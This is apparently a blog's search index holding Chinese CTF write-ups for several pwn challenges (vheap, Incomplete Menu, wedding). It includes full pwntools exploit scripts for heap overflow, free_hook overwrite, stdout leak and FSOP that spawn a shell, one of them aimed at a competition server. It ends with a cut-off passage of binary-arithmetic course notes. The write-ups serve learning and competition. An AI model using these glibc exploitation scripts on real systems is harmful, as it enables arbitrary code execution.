<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>pwnhub五月公开赛</title>
      <link href="/posts/18343.html"/>
      <url>/posts/18343.html</url>
      
        <content type="html"><![CDATA[<h2 id="vheap"><a href="#vheap" class="headerlink" title="vheap"></a>vheap</h2><p>个人感觉这道题目有点类似VMpwn，首先有一个格式化字符串漏洞泄露地址，相当于直接把libc基地址给我们了。之后让我们输入数据。我们选择输入两组数据，一组输入用于溢出free_hook，另一组单独填写system的地址。之后我们输入指令，指令为一个int类型的数字，int类型占用4字节，最多可以输入9组指令，即9个int数字。然后将我们输入的数据进行解析，并按照相应的解析进行操作。</p><p><img src="/../pictures/pwnhub%E4%BA%94%E6%9C%88%E5%85%AC%E5%BC%80%E8%B5%9B/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220512141550.png"></p><p>从这个解析函数来看，主要就是这三个带有注释的操作比较重要，<del>个人感觉其他的并没有什么用处</del>。很明显我们只能申请两个堆块，然后不管申请的堆块大小，我们都可以将之前的输入数据拷贝到堆上，因此这里有的明显的溢出。思路就比较简单了，直接溢出修改释放的堆块的fd指针，去打free_hook就行。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *r&#x3D;remote(&quot;121.40.89.206&quot;,33468)elf&#x3D;ELF(&quot;&#x2F;home&#x2F;ubuntu&#x2F;pwn&#x2F;比赛&#x2F;pwnhub春季赛&#x2F;vheap&quot;)libc&#x3D;ELF(&quot;&#x2F;home&#x2F;ubuntu&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.27-3ubuntu1.5_amd64&#x2F;libc.so.6&quot;)context(arch&#x3D;&quot;amd64&quot;,os&#x3D;&quot;linux&quot;,log_level&#x3D;&quot;debug&quot;)context.terminal &#x3D; [&#39;gnome-terminal&#39;,&#39;-x&#39;,&#39;sh&#39;,&#39;-c&#39;]def get_code(HIBYTE,SBYTE2,SBYTE1,chars):    code&#x3D;(HIBYTE&lt;&lt;(8*3))+(SBYTE2&lt;&lt;(8*2))+(SBYTE1&lt;&lt;(8*1))+chars    return coder.recvuntil(&quot;first,tell me your name.&quot;)r.sendline(&quot;%20$p&quot;)r.recvuntil(&quot;:&quot;)libc_base&#x3D;int(r.recvuntil(b&quot;\n&quot;)[:-1],16)-231-libc.symbols[&#39;__libc_start_main&#39;]success(&quot;libc_base &#x3D; &quot;+hex(libc_base))free_hook&#x3D;libc_base+libc.symbols[&#39;__free_hook&#39;]system_addr&#x3D;libc_base+libc.symbols[&#39;system&#39;]r.recvuntil(&quot;How many pieces of data?&quot;)r.sendline(&quot;2&quot;)payload&#x3D;b&quot;&#x2F;bin&#x2F;sh\x00&quot;.ljust(0x10,b&quot;a&quot;)+p64(0)+p64(0x21)+p64(free_hook)r.sendline(payload)pause()r.sendline(p64(system_addr))def add(index,size):    code&#x3D;get_code(0xa,0,size,index)    return codedef edit(index,data_index):    code&#x3D;get_code(0xb,data_index,0,index)    return codedef delete(index):    code&#x3D;get_code(0xc,0,0,index)    return coder.recvuntil(&quot;:&quot;)r.sendline(&quot;8&quot;)r.recvuntil(&quot;[+++++++++++++++++++++++++++++++++++++++++++++++++++++++++]&quot;)ints1&#x3D;add(0,0x18)ints2&#x3D;add(1,0x18)ints3&#x3D;delete(1)ints4&#x3D;edit(0,0)ints5&#x3D;add(1,0x18)ints6&#x3D;add(1,0x18)ints7&#x3D;edit(1,1)ints8&#x3D;delete(0)r.sendline(str(ints1))r.sendline(str(ints2))r.sendline(str(ints3))r.sendline(str(ints4))r.sendline(str(ints5))r.sendline(str(ints6))r.sendline(str(ints7))r.sendline(str(ints8))r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../pictures/pwnhub%E4%BA%94%E6%9C%88%E5%85%AC%E5%BC%80%E8%B5%9B/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220512142742.png"></p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>两道IO_FILE题目总结</title>
      <link href="/posts/43930.html"/>
      <url>/posts/43930.html</url>
      
        <content type="html"><![CDATA[<h2 id="ctfshow-Incomplete-Menu"><a href="#ctfshow-Incomplete-Menu" class="headerlink" title="ctfshow Incomplete Menu"></a>ctfshow Incomplete Menu</h2><p>wp链接：<a href="https://qgieod1s9b.feishu.cn/docs/doccntELBOXQWXWrRgiWteZ0Xdh?from=from_copylink">https://qgieod1s9b.feishu.cn/docs/doccntELBOXQWXWrRgiWteZ0Xdh?from=from_copylink</a></p><p>这里不再对文件进行详细分析，简单来说就是edit函数里面存在数组越界，可以写入一个字节的 ’\x00‘，但是一个堆块只能编辑一次，总共只能申请5个堆块，但是对于申请堆块的大小不做限制。</p><p>看了大佬给的wp后，思路是先修改_IO_2_1_stdout_来泄露地址，然后修改_IO_2_1_stdin_来实现任意地址写，伪造IO_FILE结构体进行FSOP劫持。</p><p>直接粘贴大佬的wp了：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *r&#x3D;process(&quot;&#x2F;home&#x2F;ubuntu&#x2F;pwn&#x2F;ctfshow&#x2F;卷王杯&#x2F;Incomplete_Menu&#x2F;pwn&quot;)elf&#x3D;ELF(&quot;&#x2F;home&#x2F;ubuntu&#x2F;pwn&#x2F;ctfshow&#x2F;卷王杯&#x2F;Incomplete_Menu&#x2F;pwn&quot;)libc&#x3D;ELF(&quot;&#x2F;home&#x2F;ubuntu&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.27-3ubuntu1_amd64&#x2F;libc.so.6&quot;)context(arch&#x3D;&quot;amd64&quot;,os&#x3D;&quot;linux&quot;,log_level&#x3D;&quot;debug&quot;)context.terminal &#x3D; [&#39;gnome-terminal&#39;,&#39;-x&#39;,&#39;sh&#39;,&#39;-c&#39;]def add(size):    r.sendlineafter(&quot;Please input your choice &gt;&gt; &quot;,&#39;1&#39;)    r.recvuntil(&quot;Please input the size of your heap &gt;&gt; &quot;)    r.sendline(str(size))def edit(index,size,content):    r.sendlineafter(&quot;Please input your choice &gt;&gt; &quot;,&#39;2&#39;)    r.recvuntil(&quot;Please input the index of your heap &gt;&gt; &quot;)    r.sendline(str(index))    r.recvuntil(&quot;Please input the length of content &gt;&gt; &quot;)    r.sendline(str(size))    r.recvuntil(&quot;Please input the content &gt;&gt; &quot;)    r.send(content)def add_x(size):    r.sendline(&#39;1&#39;)    sleep(0.1)    r.sendline(str(size))def edit_x(index,size,content):    r.sendline(&#39;2&#39;)    sleep(0.1)    r.sendline(str(index))    sleep(0.1)    r.sendline(str(size))    sleep(0.1)    r.send(content)def get_IO_str_jumps():   IO_file_jumps_offset &#x3D; libc.sym[&#39;_IO_file_jumps&#39;]   IO_str_underflow_offset &#x3D; libc.sym[&#39;_IO_str_underflow&#39;]   for ref_offset in libc.search(p64(IO_str_underflow_offset)):       possible_IO_str_jumps_offset &#x3D; ref_offset - 0x20       if possible_IO_str_jumps_offset &gt; IO_file_jumps_offset:          return possible_IO_str_jumps_offset# gdb.attach(r,&quot;b *0x55555555566e&quot;)# pause()add(0x200000)edit(0,0x201000+libc.symbols[&#39;_IO_2_1_stdout_&#39;]+1,&#39;\n&#39;)# pause()add_x(0x200000)# pause()edit_x(1,0x201000*2+libc.symbols[&quot;_IO_2_1_stdout_&quot;]+0x10+1,&#39;\n&#39;)base_addr&#x3D;u64(r.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8,b&quot;\x00&quot;))-0x3ed8b0success(&quot;base_addr&#x3D;&quot;+hex(base_addr))bin_sh_addr&#x3D;base_addr+libc.search(b&#39;&#x2F;bin&#x2F;sh\x00&#39;).__next__()payload&#x3D;p64(0)*5+p64(1)+p64(0)+p64(bin_sh_addr)payload&#x3D;payload.ljust(0xd8,b&#39;\x00&#39;)+p64(base_addr+get_IO_str_jumps()-8)payload +&#x3D; p64(0)+p64(base_addr+libc.symbols[&#39;system&#39;])gdb.attach(r,&quot;b *0x55555555566e\n b exit&quot;)pause()add(0x200000)edit(2,0x201000*3+libc.symbols[&#39;_IO_2_1_stdin_&#39;]+0x38-0x10+1,payload)payload &#x3D; p64(0xfbad208b) # _flagspayload +&#x3D; p64(base_addr + libc.sym[&#39;_IO_list_all&#39;] + 132) # _IO_read_ptrpayload +&#x3D; p64(base_addr + libc.sym[&#39;_IO_list_all&#39;]) * 6payload +&#x3D; p64(base_addr + libc.sym[&#39;_IO_list_all&#39;] + 0x10) # _IO_buf_endpayload &#x3D; payload.ljust(132, b&#39;\x00&#39;) + p64(base_addr - (0x201000 * 3 - 0x10))r.sendlineafter(&quot;&gt;&gt; &quot;, payload)r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>想记录的有几点：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">def get_IO_str_jumps():   IO_file_jumps_offset &#x3D; libc.sym[&#39;_IO_file_jumps&#39;]   IO_str_underflow_offset &#x3D; libc.sym[&#39;_IO_str_underflow&#39;]   for ref_offset in libc.search(p64(IO_str_underflow_offset)):       possible_IO_str_jumps_offset &#x3D; ref_offset - 0x20       if possible_IO_str_jumps_offset &gt; IO_file_jumps_offset:          return possible_IO_str_jumps_offset<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>大佬定义了这个函数是用来找_IO_str_jumps_在libc中的偏移的，后来从网上找了一下，_好像是说因为_IO_str_jumps不能直接通过libc.symbols[‘_IO_str_jumps’]找到偏移，因此需要自己找一下。调试的时候我发现IO_str_jumps就在IO_file_jumps下面</p><p><img src="/../pictures/%E4%B8%A4%E9%81%93IO_FILE%E9%A2%98%E7%9B%AE%E6%80%BB%E7%BB%93/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220507020934.png"></p><p>先从修改_IO_2_1_stdout_开始，修改_IO_2_1_stdout_用了两次刷零的机会，泄露了libc地址。</p><p>先放上其他大佬总结的泄露地址应满足的条件：</p><ol><li>设置<code>_flag &amp;~ _IO_NO_WRITES</code>即<code>_flag &amp;~ 0x8</code>。</li><li>设置<code>_flag &amp; _IO_CURRENTLY_PUTTING</code>即<code>_flag | 0x800</code></li><li>设置<code>_fileno</code>为1。</li><li>设置<code>_IO_write_base</code>指向想要泄露的地方；<code>_IO_write_ptr</code>指向泄露结束的地址。</li><li>设置<code>_IO_read_end</code>等于<code>_IO_write_base</code>或设置<code>_flag &amp; _IO_IS_APPENDING</code>即<code>_flag | 0x1000</code>。</li><li>设置<code>_IO_write_end</code>等于<code>_IO_write_ptr</code>（非必须）。</li></ol><p>第一次将 ‘\x00’ 刷在了_IO_read_end_的末位一字节上，第二次将 ‘\x00’ 刷在了_IO_write_base的末位两字节上。这样就泄露了0xe3个字节的信息，可以泄露出libc基地址。</p><p>泄露完地址后，就利用修改IO_2_1_stdin来实现任意地址写，在修改IO_2_1stdin的IO_buf_base的末位字节为 ‘\x00’ 后，IO_buf_base指向IO_2_1_stdin，调用fgets函数时，就会向IO_2_1_stdin读入数据，由于IO_buf_base与IO_buf_end相差132，因此最多读入132个字节。当读满132个字节后，就会向IO_buf_base中读入数据，由于之前我们伪造了IO_buf_base，因此可以实现任意地址写。这里我们是采用FSOP的方法，劫持exit函数，使其调用IO_str_finsh，并且将flags设置为0，IO_buf_base设置为bin_sh_addr，然后将IO_list_all指向的伪造的IO_FILE_plus结构体+0xe8处放上system_addr，这样在调用IO_str_finsh时会调用system(“&#x2F;bin&#x2F;sh”)。</p><p><img src="/../pictures/%E4%B8%A4%E9%81%93IO_FILE%E9%A2%98%E7%9B%AE%E6%80%BB%E7%BB%93/Inked%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220507235348_LI.jpg"></p><p>这里附上大佬总结的exit劫持为IO_str_finsh的调用过程和满足条件：</p><p>所以可以像下面这样构造：</p><ul><li>fp-&gt;_mode &#x3D; 0</li><li>fp-&gt;_IO_write_ptr &#x3D; 0xffffffff</li><li>fp-&gt;_IO_write_base &#x3D; 0</li><li>fp-&gt;_wide_data-&gt;_IO_buf_base &#x3D; bin_sh_addr （也就是 fp-&gt;_IO_write_end）</li><li>fp-&gt;_flags2 &#x3D; 0</li><li>fp-&gt;_mode &#x3D; 0</li></ul><p>完整的调用过程：<code>malloc_printerr -&gt; __libc_message -&gt; __GI_abort -&gt; _IO_flush_all_lockp -&gt; __GI__IO_str_finish</code>。</p><h2 id="2022DASCTF-X-SU-wedding"><a href="#2022DASCTF-X-SU-wedding" class="headerlink" title="2022DASCTF_X_SU wedding"></a>2022DASCTF_X_SU wedding</h2><p>wp：<a href="https://www.cnblogs.com/LynneHuan/p/16070118.html">https://www.cnblogs.com/LynneHuan/p/16070118.html</a></p><p>这篇主要参考了这个大佬的wp进行了复现，<del>（其实就是把大佬的exp抄了一遍）</del>，<del>大佬这道题用了三种方法，我太菜了，只抄了一遍第二种方法</del>。这道题也是主要运用了数组越界的漏洞，首先利用preapare函数修改IO_2_1_stdout的flags和IO_write_base，分别写了一个0x135和0x1314，这样下次就可以泄露大量数据，由于修改了IO_write_base的两个字节，因此每次泄露的数据不固定，大佬找到了一个地址附近同时泄露了elf_base，libc_base和heap_base（这三个基地址后续我们都会用到），但是关闭ASLR时无法泄露大佬找到的那个地址。然后就是我们想要实现任意地址写，由于第二个revise函数给了限制写入次数的条件，因此我们想要先修改掉统计次数的两个变量。我们还有一次preapare的机会，我们利用这次机会修改size[index]的处的值&gt;0x999，这样我们就可以读入8个字节从而一次修改两个变量，然后我们利用revise函数将统计次数的两个变量改为较小的负数，这样我们就获得了多次修改的机会。</p><p><img src="/../pictures/%E4%B8%A4%E9%81%93IO_FILE%E9%A2%98%E7%9B%AE%E6%80%BB%E7%BB%93/Inked%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220508002342_LI.jpg"></p><p>我们在修改size[index]的时候申请了一个0x110大小的堆块，我们利用现在多次编辑的函数，在上面写入0x2000用于作为下一次判断size[index]的大小的位置，这样我们下次我们就可以写入8个字节而不是3个字节。之后我们计算好偏移，申请适量的堆块，使得最后一次申请到的地址刚好满足在heap[index]处。而申请的堆块超过7个后，每次申请的堆块都会在0处，这样我们就实现了任意地址写的机会。大佬的思路是劫持puts函数调用_IO_str_finish，下面是大佬劫持的思路：</p><ul><li>继续使用跳板，将<code>stderr-&gt;vtable</code>修改为<code>_IO_str_jumps</code>；将<code>_IO_2_1_stderr_+131</code>处修改为<code>sh;</code>；将<code>__free_hook</code>修改为<code>system</code>；将<code>stderr-&gt;flags</code>修改为<code>0x80</code>；最后把<code>bss</code>段上的<code>stdout</code>修改为<code>_IO_2_1_stderr_</code>。接着，在调用<code>puts(xxx)</code>的时候，会调用<code>stderr-&gt;vtable-&gt;_IO_file_xsput</code>，实际调用的是<code>_IO_str_finish</code>，接着调用<code>free(fp-&gt;_IO_buf_base)</code>，就是调用<code>system(&quot;sh;&quot;)</code></li></ul><p>exp：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *r&#x3D;process(&quot;&#x2F;home&#x2F;ubuntu&#x2F;pwn&#x2F;比赛&#x2F;2022DASCTF_X_SU&#x2F;wedding_room&#x2F;wedding_room&quot;)elf&#x3D;ELF(&quot;&#x2F;home&#x2F;ubuntu&#x2F;pwn&#x2F;比赛&#x2F;2022DASCTF_X_SU&#x2F;wedding_room&#x2F;wedding_room&quot;)libc&#x3D;ELF(&quot;&#x2F;home&#x2F;ubuntu&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.31-0ubuntu9.7_amd64&#x2F;libc.so.6&quot;)context(arch&#x3D;&quot;amd64&quot;,os&#x3D;&quot;linux&quot;,log_level&#x3D;&quot;debug&quot;)context.terminal &#x3D; [&#39;gnome-terminal&#39;,&#39;-x&#39;,&#39;sh&#39;,&#39;-c&#39;]def get_IO_str_jumps():   IO_file_jumps_offset &#x3D; libc.sym[&#39;_IO_file_jumps&#39;]   IO_str_underflow_offset &#x3D; libc.sym[&#39;_IO_str_underflow&#39;]   for ref_offset in libc.search(p64(IO_str_underflow_offset)):       possible_IO_str_jumps_offset &#x3D; ref_offset - 0x20       if possible_IO_str_jumps_offset &gt; IO_file_jumps_offset:          return possible_IO_str_jumps_offsetdef add(size, length&#x3D;None):    r.sendlineafter(&quot;&gt;&gt; \n&quot;, &#39;1&#39;)    if size &gt; 0x7fffffff:        size -&#x3D; (0x1 &lt;&lt; 32)    r.sendafter(&quot;&gt;&gt; \n&quot;, str(size).ljust(8,&#39;\x00&#39;))    if length is not None:        r.sendafter(&quot;&gt;&gt; \n&quot;, str(length).ljust(8,&#39;\x00&#39;))    def edit(index, content&#x3D;None):    r.sendlineafter(&quot;your choice &gt;&gt; \n&quot;, &#39;2&#39;)    r.sendlineafter(&quot;which packet you want to revise&gt;&gt; \n&quot;, str(index))    r.sendafter(&quot;now write your wish&gt;&gt; \n&quot;, content)def dbg():    gdb.attach(r,&quot;b *$rebase(0x162A)\n b *$rebase(0x15BD)&quot;)    pause()off_first &#x3D; 0x42ff0# dbg()add(0x40000,off_first + libc.symbols[&#39;_IO_2_1_stdout_&#39;]+1)add(0x40000, off_first + 0x83ff0 - 0x42ff0 + libc.sym[&#39;_IO_2_1_stdout_&#39;] + 0x20)r.recvuntil(p64(0xfffffffffffffff8), timeout&#x3D;5)m1 &#x3D; r.recv(0x10)r.recvuntil(p64(0xffffffffffffff78), timeout&#x3D;5)m2 &#x3D; r.recv(0x2d8)elf_base&#x3D;u64(m1[:8])-0x4040libc_base&#x3D;u64(m1[8:0x10])-0x1f1530heap_base&#x3D;u64(m2[-8:])success(&quot;elf_base &#x3D; &quot;+hex(elf_base))success(&quot;libc_base &#x3D; &quot;+hex(libc_base))success(&quot;heap_base &#x3D; &quot;+hex(heap_base))free_hook&#x3D;libc_base+libc.symbols[&#39;__free_hook&#39;]system_addr&#x3D;libc_base+libc.symbols[&#39;system&#39;]IO_2_1_stderr&#x3D;libc_base+libc.symbols[&#39;_IO_2_1_stderr_&#39;]IO_str_jumps&#x3D;libc_base+get_IO_str_jumps()edit(-19,p64(elf_base+0x4050)[:3])dbg()target_addr &#x3D; elf_base + 0x4015heap_addr &#x3D; heap_base + 0x2a0success(&quot;d &#x3D; &quot;+hex(target_addr-heap_addr))assert len(str(target_addr-heap_addr)) &lt;&#x3D; 8, &quot;try again&quot;add(0x100, target_addr-heap_addr)# dbg()edit(-19, p32(0xff000000)*2) edit(2,p16(0x2000))#通过申请适量的堆块，使得可以写入想要修改的地址，通过size的验证。size_addr&#x3D;elf_base+0x4060elf_heap_addr&#x3D;elf_base+0x40a0size_index&#x3D;(heap_addr-size_addr)&#x2F;&#x2F;4over_read_addr&#x3D;(8*size_index)+elf_heap_addrtop_chunk&#x3D;heap_base+0x3a0distance&#x3D;over_read_addr-top_chunk-0x10success(&quot;distance &#x3D; &quot;+hex(distance))count&#x3D;2malloc_size&#x3D;0x10010while True:    times,heap_size&#x3D;divmod(distance,malloc_size)    if heap_size&#x3D;&#x3D;0 or heap_size&gt;&#x3D;0x20:        break    else:        malloc_size -&#x3D; 0x10for i in range(times):    add(malloc_size-0x10)    count+&#x3D;1if heap_size:    add(heap_size-0x10)    count+&#x3D;1add(0x1000) #target_heapcount+&#x3D;1if count&gt;7:    count&#x3D;0# pause()# dbg()edit(count,p64(free_hook))edit(size_index,p64(system_addr))edit(count,p64(IO_2_1_stderr+216))edit(size_index,p64(IO_str_jumps-0x28))edit(count,p64(IO_2_1_stderr+131))edit(size_index,&#39;sh;&#39;)edit(count,p64(IO_2_1_stderr))edit(size_index,p8(0x80))edit(count,p64(elf_base+0x4020))edit(size_index,p64(IO_2_1_stderr))r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://ctf-show.feishu.cn/docs/doccntELBOXQWXWrRgiWteZ0Xdh#">https://ctf-show.feishu.cn/docs/doccntELBOXQWXWrRgiWteZ0Xdh#</a></p><p><a href="https://www.cnblogs.com/LynneHuan/p/16070118.html">https://www.cnblogs.com/LynneHuan/p/16070118.html</a></p><p><a href="https://ray-cp.github.io/archivers/IO_FILE_arbitrary_read_write">https://ray-cp.github.io/archivers/IO_FILE_arbitrary_read_write</a></p><p><a href="https://forum.butian.net/share/1516">https://forum.butian.net/share/1516</a></p><p><a href="https://www.shuzhiduo.com/A/gVdnM6DD5W/">https://www.shuzhiduo.com/A/gVdnM6DD5W/</a></p><p><a href="https://www.cnblogs.com/pwnfeifei/p/15793432.html">https://www.cnblogs.com/pwnfeifei/p/15793432.html</a></p><p><a href="https://ray-cp.github.io/archivers/IO_FILE_vtable_hajack_and_fsop#fsop">https://ray-cp.github.io/archivers/IO_FILE_vtable_hajack_and_fsop#fsop</a></p><p><a href="https://www.bookstack.cn/read/CTF-All-In-One/doc-4.13_io_file.md">https://www.bookstack.cn/read/CTF-All-In-One/doc-4.13_io_file.md</a></p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>机组二进制运算总结</title>
      <link href="/posts/45720.html"/>
      <url>/posts/45720.html</url>
      
        <content type="html"><![CDATA[<h2 id="加法减法运算"><a href="#加法减法运算" class="headerlink" title="加法减法运算"></a>加法减法运算</h2><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">[X]补 + [Y]补 = [X+Y]补[X]补 - [Y]补 = [X-Y]补进位产生的超出机器字长的部分，舍掉（被模掉了）溢出判断方法：单符号位判断法：    结果符号判断法：        同号相加：结果符号与被加数相异则溢出        异号相减：结果符号与被减数相异则溢出    进位符号判断法：        数值最高进位值与符号位进位相异则溢出双符号位判别法（通过实现变形补码实现）：    双符号位参与运算，结果双符号位相异则溢出    00：正数11：负数01：正溢出10：负溢出    第一位符号位为运算结果的真正符号位<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="浮点数表示范围"><a href="#浮点数表示范围" class="headerlink" title="浮点数表示范围"></a>浮点数表示范围</h2><p><img src="/../pictures/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E6%B3%95%E6%80%BB%E7%BB%93/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220505004244.png"></p><p><img src="/../pictures/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E6%B3%95%E6%80%BB%E7%BB%93/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220505004323.png"></p><p><img src="/../pictures/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E6%B3%95%E6%80%BB%E7%BB%93/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220505004558.png" alt="微信图片_20220505004558"></p><h2 id="乘法运算"><a href="#乘法运算" class="headerlink" title="乘法运算"></a>乘法运算</h2><h3 id="原码乘法"><a href="#原码乘法" class="headerlink" title="原码乘法"></a>原码乘法</h3><h4 id="原码一位乘法"><a href="#原码一位乘法" class="headerlink" title="原码一位乘法"></a>原码一位乘法</h4><pre class="line-numbers language-none"><code class="language-none">符号位单独处理：X0⊕Y0乘数当前末位为0，加0后部分积右移一位；乘数当前末位为1，加|X|后部分积右移一位。最后一次相加后的结果也要右移，有几位就要右移几次部分积采用双符号位<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../pictures/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E6%B3%95%E6%80%BB%E7%BB%93/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220505005230.png"></p><h4 id="原码两位乘法"><a href="#原码两位乘法" class="headerlink" title="原码两位乘法"></a>原码两位乘法</h4><pre class="line-numbers language-none"><code class="language-none">1.原码两位乘法和原码一位乘法一样，符号位不参加运算2.部分积和被乘数x均采用三位符号，乘数y末位每次要加一个c，c一开始是03.根据如下法则进行运算：    · 000 -》 部分积加0，   右移两位，c变为0    · 001 -》 部分积加|x|， 右移两位，c变为0    · 010 -》 部分积加|x|， 右移两位，c变为0    · 011 -》 部分积加2|x|，右移两位，c变为0    · 100 -》 部分积加2|x|，右移两位，c变为0    · 101 -》 部分积减|x|， 右移两位，c变为1    · 110 -》 部分积减|x|， 右移两位，c变为1    · 111 -》 部分积加0，   右移两位，c变为1        其中减|x|等价于加[-|X|]补，因此在计算前，需要准备|X|（用三符号位）,2|X|（用三符号位）,[-|X|]补（用三符号位） 和 |Y|（用单符号位）,4.而乘数y用双符号还是单符号表示得根据乘数y的数值的奇偶性判断，而且最后一步移位与否也与乘数y的数值的奇偶性有关：    · 如果乘数y的尾数n的位数为偶数，则乘数y用双符号表示，最后一步不移位    · 如果乘数y的尾数n的位数为奇数，则乘数y用单符号表示，最后一步要移一位<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../pictures/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E6%B3%95%E6%80%BB%E7%BB%93/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220505010727.png"></p><p><img src="/../pictures/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E6%B3%95%E6%80%BB%E7%BB%93/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220505010730.png"></p><h3 id="定点数补码乘法"><a href="#定点数补码乘法" class="headerlink" title="定点数补码乘法"></a>定点数补码乘法</h3><p>补码乘法：符号位在运算中同时产生（不需要单独运算）</p><h4 id="定点数补码一位乘"><a href="#定点数补码一位乘" class="headerlink" title="定点数补码一位乘"></a>定点数补码一位乘</h4><h5 id="校正法"><a href="#校正法" class="headerlink" title="校正法"></a>校正法</h5><pre class="line-numbers language-none"><code class="language-none">乘数的补码 [Y]补 去掉符号位，当成正数与被乘数 [X]补 按照同原码一致的方法相乘两个n位数相乘，共做n次加法和n次移位部分积采用双符号位右移时按照补码的规则进行（左边补符号位）*乘数为负数时，最后求出的部分 +[-X]补 进行修正，但是不进行移位操作<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../pictures/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E6%B3%95%E6%80%BB%E7%BB%93/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220505012124.png"></p><p><img src="/../pictures/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E6%B3%95%E6%80%BB%E7%BB%93/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220505012128.png"></p><h5 id="比较法"><a href="#比较法" class="headerlink" title="比较法"></a>比较法</h5><pre class="line-numbers language-none"><code class="language-none">部分积和被乘数使用双符号位，乘数采用一位符号位需要在乘数的末位加上一位附加位，附加位初始值为0，Yn+1&#x3D;0通过比较末两位决定操作： 若Yn＋1＜Yn，部分积＋[-X]补，     若Yn＋1＝Yn，部分积＋0，     